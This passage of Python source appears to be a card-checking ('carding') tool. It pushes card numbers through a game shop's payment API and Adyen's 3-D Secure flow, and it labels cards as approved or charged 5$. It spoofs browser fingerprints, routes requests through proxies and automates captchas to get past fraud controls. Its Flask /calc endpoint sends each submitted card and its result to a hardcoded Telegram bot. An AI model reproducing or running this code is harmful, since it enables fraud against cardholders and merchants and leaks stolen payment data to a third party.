	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Upgrade-Insecure-Requests': "1",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "navigate",
	  'Sec-Fetch-User': "?1",
	  'Sec-Fetch-Dest': "document",
	  'Referer': "https://checkoutshopper-live.adyen.com/",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "_fbp=fb.1.1778669025882.710039830500289481; _ga_0NY2JETSPJ=GS2.1.s1778668639$o1$g1$t1778669029$j23$l0$h0"
	}
	
	response = requests.get(url, params=params, headers=headers,proxies=proxies, timeout=30)


	return response.cookies['mspid2']


def checkwithcp(keyc,txtc,cs,sessionid,datom,ses,cc,exp,exy,cvc,tycc,useragent,encodedd):


	
	
	url = "https://shop2game.com/api/shop/pay/init"
	
	params = {
	  'region': "ME",
	  'language': "ar"
	}
	
	payload = {
	  "app_id": 100067,
	  "packed_role_id": 0,
	  "channel_id": 230199,
	  "service": "mb",
	  "item_id": 3,
	  "channel_data": {
	    "card_data": {
	      "riskData": {
	        "clientData": encodedd
	      },
	      "paymentMethod": {
	        "type": "scheme",
	        "encryptedCardNumber": cc,
        "encryptedExpiryMonth": exp,
        "encryptedExpiryYear": exy,
        "encryptedSecurityCode": cvc,
	        "brand": tycc
	      },
	      "browserInfo": {
	        "acceptHeader": "*/*",
	        "colorDepth": 24,
	        "language": "en-US",
	        "javaEnabled": False,
	        "screenHeight": 886,
	        "screenWidth": 393,
	        "userAgent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	        "timeZoneOffset": -180
	      },
	      "clientStateDataIndicator": True
	    },
	    "save_card": False
	  },
	  "captcha_key": keyc,
	  "captcha": txtc,
	  "revamp_experiment": {
	    "session_id": sessionid,
	    "group": "treatment2",
	    "service_version": "mshop_frontend_20260428",
	    "source": "mb",
	    "domain": "shop2game.com"
	  }
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'x-csrf-token': cs,
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://shop2game.com",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': "https://shop2game.com/buy?app=100067&channel=230199&item=26781",
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': f"_fbp=fb.1.1778540661677.18702671886384939; language=ar; mspid2={sessionid}; _ga=GA1.1.1035337237.1778540731; region=ME; datadome={datom}; session_key={ses}; _ga_0NY2JETSPJ=GS2.1.s1778542621$o2$g1$t1778542673$j8$l0$h0; __csrf__={cs}"
	}
	
	import json,requests
	response = requests.post(url, params=params, data=json.dumps(payload), headers=headers,proxies=proxies, timeout=30)
	
	if 'error_fraud' in response.text:
		return ('Error Fraud ❌')
	if 'error_captcha' in response.text:
		return ('Error Captcha ❌')
	if 'error_auth' in response.text:
		return ('Error Auth ❌')
		
	if 'error_insufficient_funds' in response.text:
		return ('APPROVED NOT FUNDS ✅')
		
	if 'error_invalid_cvn' in response.text:
		return ('APPROVED CCN ✅')
	if 'Order' in response.text or 'Success' in response.text or 'Transaction' in response.text:
		return 'CHARGE 5$ ✅'
		
	try:
		
		display_id=response.json()['display_id']
		urlreq=(response.json()['init']['url'])
		MD=(response.json()['init']['params']['MD'])
		TermUrl=(response.json()['init']['params']['TermUrl'])
		PaReq=(response.json()['init']['params']['PaReq'])
	except:
		return response.text


	
	payload = {
	  'MD': MD,
	  'TermUrl': TermUrl,
	  'PaReq': PaReq
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://shop2game.com",
	  'sec-fetch-site': "cross-site",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-user': "?1",
	  'sec-fetch-dest': "document",
	  'referer': "https://shop2game.com/",
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "_rp_uid=80749da9-ee63-6cb0-f181-09d578f334c3; __cf_bm=Vcn4YEW9nUVVfMz3NaHGXkutfjMs8BrNfxbkSIEgoh4-1778668658.246529-1.0.1.1-U2dl18ohna2Aezc2pYZB3vlMUzi.TX4N4Gbr_1ZCVS2IFnaox2kECMEa1bSEDcLcPBMYo4PeXKetVQvA_R.eAj.1ivF6Dmr.AlweBzoBRoIBQYfjzwcmZ_i_kMJmZd5.; _cfuvid=ncRvq_Zj5WsH11c7.nYqY9QfmdmFDRljiI.dCZlboyo-1778668658.246529-1.0.1.1-whYZrTtqRsZ7f3cuPXDjKrCov23DcmFHJByVF8auOMg"
	}
	
	response = requests.post(urlreq, data=payload, headers=headers,proxies=proxies, timeout=30)
	originKe=(response.text.split('originKey: ')[1].split('"')[1])
	checkoutAttemptId=(response.text.split('checkoutAttemptId:')[1].split('"')[1])
	fingerprintToken=(response.text.split('fingerprintToken:')[1].split('"')[1])
	returnUrl=(response.text.split('returnUrl:')[1].split('"')[1])
	det=returnUrl.split('https://checkoutshopper-live.adyen.com/checkoutshopper/threeDS/return/')[1].split('"')[0]
	md=(response.text.split('md:')[1].split('"')[1])
	paReq=(response.text.split('paReq:')[1].split('"')[1])
	pspReference=(response.text.split('pspReference:')[1].split('"')[1])

	url = "https://checkoutshopper-live.adyen.com/checkoutshopper/submitFingerprint.shtml"
	
	payload = {
	  'PaReq': PaReq,
	  'browserInfoString': '{"acceptHeader":"*/*","javaScriptEnabled":true,"colorDepth":24,"language":"en-US","javaEnabled":false,"screenHeight":886,"screenWidth":393,"userAgent":"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36","timeZoneOffset":-180}',
	  'browserDAInfoString': '{"supported":false,"notSupportedReason":"Device does not have platform authenticator","browserName":"Chrome","browserVersion":"139.0.0.0","deviceVendor":"","deviceModel":"K","OSName":"Android","OSVersion":"10"}',
	  'threeDSCompInd': 'Y'
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'baggage': "sentry-environment=live,sentry-release=3.0.0,sentry-public_key=aac286817d4743329b90b27547a1b255,sentry-trace_id=6a4d670070b44752a117ad53d8b82a53",
	  'sec-ch-ua-mobile': "?1",
	  'sentry-trace': "6a4d670070b44752a117ad53d8b82a53-b233f9650c13add6-0",
	  'sec-ch-ua-platform': "\"Android\"",
	  'origin': "https://checkoutshopper-live.adyen.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "cors",
	  'sec-fetch-dest': "empty",
	  'referer': urlreq,
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "_rp_uid=80749da9-ee63-6cb0-f181-09d578f334c3; __cf_bm=Vcn4YEW9nUVVfMz3NaHGXkutfjMs8BrNfxbkSIEgoh4-1778668658.246529-1.0.1.1-U2dl18ohna2Aezc2pYZB3vlMUzi.TX4N4Gbr_1ZCVS2IFnaox2kECMEa1bSEDcLcPBMYo4PeXKetVQvA_R.eAj.1ivF6Dmr.AlweBzoBRoIBQYfjzwcmZ_i_kMJmZd5.; _cfuvid=ncRvq_Zj5WsH11c7.nYqY9QfmdmFDRljiI.dCZlboyo-1778668658.246529-1.0.1.1-whYZrTtqRsZ7f3cuPXDjKrCov23DcmFHJByVF8auOMg"
	}
	
	response = requests.post(url, data=payload, headers=headers,proxies=proxies, timeout=30)
	try:
		pare=(response.json()['PaRes'])
	except:
		return 'OTP CHALLENGE ❌'
	url = "https://checkoutshopper-live.adyen.com/checkoutshopper/threeDS/return/"+det

	payload = {
	  'MD': md,
	  'PaRes': pare
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://checkoutshopper-live.adyen.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-dest': "document",
	  'referer': urlreq,
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "_rp_uid=80749da9-ee63-6cb0-f181-09d578f334c3; __cf_bm=Vcn4YEW9nUVVfMz3NaHGXkutfjMs8BrNfxbkSIEgoh4-1778668658.246529-1.0.1.1-U2dl18ohna2Aezc2pYZB3vlMUzi.TX4N4Gbr_1ZCVS2IFnaox2kECMEa1bSEDcLcPBMYo4PeXKetVQvA_R.eAj.1ivF6Dmr.AlweBzoBRoIBQYfjzwcmZ_i_kMJmZd5.; _cfuvid=ncRvq_Zj5WsH11c7.nYqY9QfmdmFDRljiI.dCZlboyo-1778668658.246529-1.0.1.1-whYZrTtqRsZ7f3cuPXDjKrCov23DcmFHJByVF8auOMg"
	}
	
	response = requests.post(url, data=payload, headers=headers,proxies=proxies, timeout=30)
	
	md1=(response.text.split('name="MD" value=')[1].split('"')[1])
	pares1=(response.text.split('name="PaRes" value=')[1].split('"')[1])
	

	url = "https://checkoutshopper-live.adyen.com/checkoutshopper/threeDS/return/"+det
	
	payload = {
	  'MD': md1,
	  'PaRes': pares1,
	  'intermediateReturn': "true"
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
	  'cache-control': "max-age=0",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'upgrade-insecure-requests': "1",
	  'origin': "https://checkoutshopper-live.adyen.com",
	  'sec-fetch-site': "same-origin",
	  'sec-fetch-mode': "navigate",
	  'sec-fetch-dest': "document",
	  'referer': url,
	  'accept-language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': "_rp_uid=80749da9-ee63-6cb0-f181-09d578f334c3; __cf_bm=Vcn4YEW9nUVVfMz3NaHGXkutfjMs8BrNfxbkSIEgoh4-1778668658.246529-1.0.1.1-U2dl18ohna2Aezc2pYZB3vlMUzi.TX4N4Gbr_1ZCVS2IFnaox2kECMEa1bSEDcLcPBMYo4PeXKetVQvA_R.eAj.1ivF6Dmr.AlweBzoBRoIBQYfjzwcmZ_i_kMJmZd5.; _cfuvid=ncRvq_Zj5WsH11c7.nYqY9QfmdmFDRljiI.dCZlboyo-1778668658.246529-1.0.1.1-whYZrTtqRsZ7f3cuPXDjKrCov23DcmFHJByVF8auOMg"
	}
	
	response = requests.post(url, data=payload, headers=headers,proxies=proxies, timeout=30)
	
	urlrwf=(response.text.split('<p>Click <a href=')[1].split('"')[1])
	import json
	
	url = "https://shop2game.com/api/shop/pay/poll"
	
	params = {
	  'region': "ME",
	  'language': "ar"
	}
	
	payload = {
	  "display_id": display_id
	}
	
	headers = {
	  'User-Agent': "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
	  'Accept': "application/json, text/plain, */*",
	  'Content-Type': "application/json",
	  'sec-ch-ua': "\"Chromium\";v=\"139\", \"Not;A=Brand\";v=\"99\"",
	  'sec-ch-ua-mobile': "?1",
	  'sec-ch-ua-platform': "\"Android\"",
	  'Origin': "https://shop2game.com",
	  'Sec-Fetch-Site': "same-origin",
	  'Sec-Fetch-Mode': "cors",
	  'Sec-Fetch-Dest': "empty",
	  'Referer': urlrwf,
	  'Accept-Language': "en-US,en;q=0.9,ar-EG;q=0.8,ar;q=0.7",
	  'Cookie': f"_fbp=fb.1.1778669025882.710039830500289481; source=mb; language=ar; mspid2={sessionid}; _ga=GA1.1.607855350.1778669034; region=ME; session_key={ses}; __csrf__={cs}; _ga_0NY2JETSPJ=GS2.1.s1778669034$o1$g1$t1778669471$j25$l0$h0; datadome={datom}"
	}
	success = False
	num='.'
	while True:
		response = requests.post(url, params=params, data=json.dumps(payload), headers=headers,proxies=proxies, timeout=30)
		if 'task_pending' in response.text or 'pending' in response.text:
			time.sleep(2.5)
		else:
			if 'task_failed' in response.text:
				return 'PAYMENT DECLINED ❌'
			if 'error_fraud' in response.text:
				return ('Error Fraud ❌')
			if 'error_captcha' in response.text:
				return ('Error Captcha ❌')
			if 'error_auth' in response.text:
				return ('Error Auth ❌')
				
			if 'error_insufficient_funds' in response.text:
				return ('APPROVED NOT FUNDS ✅')
				
			if 'error_invalid_cvn' in response.text:
				return ('APPROVED CCN ✅')
			if 'Order' in response.text or 'Success' in response.text or 'Transaction' in response.text:
				return 'CHARGE 5$ ✅'
			else:
				return response.text
				

def typecard(cc):
	cc=cc.split('|')[0]
	type=int(cc[0])
	if type == 5:
		type= 'mc'
	if type == 4:
		type='visa'
	if type == 3:
		type='ax'
	if type == 6:
		type='dx'
	return type


def run(k,aut):
	pu=('3477906171','1666397772','2114383021','2114383021','2828550589','2828550589')
	playeruuid=random.choices(pu)[0]
	uag=useragent()
	json_text = json.dumps(data, separators=(",", ":"))
	encoded = base64.b64encode(
	    json_text.encode("utf-8")
	).decode("utf-8")
	ok=loginid(playeruuid,uag)
	cs=(getcsrf(ok[0],ok[1],uag))
	sessionid=(session_id(ok[0],ok[1],cs,uag))
	keycaptcha=time_based_uuid()
	ad=adyenencrypt(k,uag)
	ccs=ad[0]
	exp=ad[1]
	exy=ad[2]
	cvc=ad[3]
	g=captcha(uag,keycaptcha,aut)
	typecc=typecard(k)
	re=(checkwithcp(g[1],g[0],cs,sessionid,ok[1],ok[0],ccs,exp,exy,cvc,typecc,uag,encoded))
	return re




TOKEN_LIMIT = 5


# -----------------------
# حالة داخل الذاكرة
# -----------------------
state = {
    "token": None,
    "requests": deque(maxlen=TOKEN_LIMIT)
}




# -----------------------
# init token
# -----------------------
if not state["token"]:
    state["token"] = generate_token()



# -----------------------
# /calc endpoint
# -----------------------
@app.route("/calc", methods=["GET"])
def calc():
    a = request.args.get("cc")

    if not a:
        return jsonify({"error": "missing cc"}), 400

    # -----------------------
    # request id
    # -----------------------
    req_id = str(uuid.uuid4())
    state["requests"].append(req_id)
    if len(state["requests"]) >= TOKEN_LIMIT:
        state["token"] = generate_token()
        state["requests"].clear()

    try:
        result = run(a,state["token"])
    except Exception as e:
        result = "Proxy Bad ❌"

    # -----------------------
    # Telegram log
    # -----------------------
    try:
        text = f"{req_id}|{a}|{result}"
        encoded = urllib.parse.quote(text)

        requests.get(
            f"https://api.telegram.org/bot6805632917:AAH82BRjPN6PdWrLIjFlCeELSBjmQ3REnOo/sendMessage"
            f"?chat_id=6689099522&text={encoded}"
        )
    except Exception as e:
        print("Telegram error:", e)

    # -----------------------
    # response
    # -----------------------
    return jsonify({
        "request_id": req_id,
        "card": a,
        "amount": "5$",
        "gateway": "Shop2Game",
        "result": result,

    })



def handler(environ, start_response):
    return app(environ, start_response)
